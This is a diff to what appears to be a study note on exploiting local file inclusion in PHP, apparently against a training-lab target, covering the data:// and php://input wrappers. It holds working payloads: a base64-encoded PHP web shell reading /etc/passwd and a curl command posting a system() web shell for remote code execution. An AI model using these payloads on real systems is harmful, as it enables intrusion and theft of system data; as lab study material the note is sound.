@@ -311,3 +311,27 @@ http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%
 
 http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d&cmd=cd+../../../;cat+/etc/passwd
 ```
+
+### PHP Input Wrapper
+
+The PHP **input wrapper** (`php://input`) is similar to the **data wrapper**, in that it can also be abused to achieve remote code execution. The key difference is how data is supplied:
+
+- The **data wrapper** passes payloads via GET parameters
+- The **input wrapper** passes payloads via POST parameters
+
+The input wrapper works by treating the raw POST body as a PHP file. When the application includes `php://input`, any PHP code supplied in the POST request body is parsed and executed.
+
+This technique typically requires:
+
+- An LFI vulnerability using `include()` or `require()`
+- `allow_url_include = On` in many environments (though behavior may vary by PHP version and configuration)
+
+**Example:**
+
+In this example, a PHP web shell is sent as POST data, while commands are supplied via the `cmd` GET parameter:
+
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.55.43:35886/index.php?language=php://input&cmd=id"
+```
+
+Unlike `php://filter`, the `php://input` wrapper allows direct code execution and is therefore a high-impact LFI escalation technique when enabled.
